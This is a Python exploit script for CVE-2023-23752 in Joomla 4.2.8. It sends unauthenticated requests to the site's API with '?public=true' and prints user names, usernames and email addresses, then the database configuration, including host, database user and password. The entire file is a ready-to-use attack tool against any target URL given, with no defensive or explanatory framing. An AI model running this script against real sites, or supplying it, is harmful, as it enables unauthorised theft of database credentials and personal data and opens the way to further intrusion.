import argparse
import requests
import json

class Joomla():
    def __init__(self,target):
        self.url = self.check_url(target)
        self.extract_users()
        self.extract_config()

    def check_url(self,target):
        check = target[-1]
        if check == "/":
            return target
        else:
            fixed_url = target + "/"
            return fixed_url

    def extract_users(self):
        requests.packages.urllib3.disable_warnings()
        users_api = "api/index.php/v1/users?public=true"
        users_requests = requests.get(self.url + users_api, verify=False)
        parsed_data = json.loads(users_requests.text)

        for user_data in parsed_data["data"]:
            name = user_data["attributes"]["name"]
            username = user_data["attributes"]["username"]
            email = user_data["attributes"]["email"]
            
            print("User Information found:")
            print(f"Name: {name}, Username: {username}, Email: {email}\n")

    def extract_config(self):
        requests.packages.urllib3.disable_warnings()
        config_api = "api/index.php/v1/config/application?public=true"
        config_requests = requests.get(self.url + config_api, verify=False)
        parsed_data = json.loads(config_requests.text)

        print("Database Configuration Found:")
        for config_data in parsed_data["data"]:
            if "dbtype" in config_data["attributes"]:
                dbtype = config_data["attributes"]["dbtype"]
                print(f"DB Type: {dbtype}") 
            if "host" in config_data["attributes"]:
                host = config_data["attributes"]["host"]
                print(f"Host: {host}")
            if "user" in config_data["attributes"]:
                user = config_data["attributes"]["user"]
                print(f"User: {user}")
            if "password" in config_data["attributes"]:
                password = config_data["attributes"]["password"]
                print(f"Password: {password}")
            if "db" in config_data["attributes"]:
                db = config_data["attributes"]["db"]
                print(f"Database: {db}")
            if "dbprefix" in config_data["attributes"]:
                dbprefix = config_data["attributes"]["dbprefix"]
                print(f"DB Prefix: {dbprefix}")
            if "dbsslverifyservercert" in config_data["attributes"]:
                dbsslverifyservercert = config_data["attributes"]["dbsslverifyservercert"]
                print(f"Dbsslverifyservercert: {dbsslverifyservercert}")

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='CVE-2023-23752 Joomla! v4.2.8 - Unauthenticated Information Disclosure')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://joomla.url/', required=True)
    args = parser.parse_args()
    
    try:
        print('CVE-2023-23752 Joomla! v4.2.8 - Unauthenticated Information Disclosure\n')
        Joomla(args.t)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()